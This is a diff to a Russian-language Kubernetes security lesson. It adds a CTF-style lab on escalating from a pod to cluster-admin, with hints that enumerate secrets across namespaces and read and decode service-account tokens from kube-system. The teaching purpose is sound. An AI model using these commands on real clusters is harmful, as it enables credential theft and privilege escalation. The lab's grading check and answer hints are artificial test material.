@@ -13,6 +13,18 @@ useful_for:
   - "CTF и пентест облачных оркестраторов"
 estimated_minutes: 55
 summary: "Kubernetes — control plane облачных ворклоадов. Разбираем API server, kubeconfig, RBAC, service-account токены, аудит прав и классические атаки: privileged pod, hostPath, кража секретов и побег на ноду."
+lab:
+  kind: shell
+  title: "Практика: RBAC — из пода в cluster-admin"
+  toolset: [core, kubectl]
+  workdir: /home/student/k8s
+  files: [task.md, notes.md, serviceaccount/token, serviceaccount/namespace, serviceaccount/ca.crt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Выясни свои права: `kubectl auth can-i --list`."
+    - "Перечисли секреты во всех namespace: `kubectl get secrets -A`."
+    - "Прочитай чужой токен: `kubectl get secret ci-deployer-token -n kube-system -o jsonpath='{.data.token}'`."
+    - "Найди секрет с флагом и декодируй: `kubectl get secret cluster-admin-token -n kube-system -o jsonpath='{.data.token}' | base64 -d > found.txt`."
 ---
 
 ## Задача
